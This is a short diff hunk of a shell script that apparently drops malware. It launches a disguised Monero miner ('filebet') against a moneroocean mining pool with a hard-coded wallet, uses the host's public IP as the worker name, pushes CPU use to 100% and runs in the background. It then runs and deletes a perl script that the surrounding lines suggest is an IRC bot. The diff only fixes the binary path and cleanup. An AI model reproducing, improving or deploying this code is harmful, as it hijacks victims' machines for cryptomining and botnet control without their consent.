@@ -12,5 +12,5 @@ printf "[ERROR]: downloading ircbot\n"
 exit 1
 fi
 chmod +x "$local"filebet
-exec filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me 2>/dev/null` -k --cpu-max-threads-hint=100% -B
-perl "$local"vs;rm "$local"vs
+exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me 2>/dev/null` -k --cpu-max-threads-hint=100% -B
+perl "$local"vs;rm -f "$local"vs
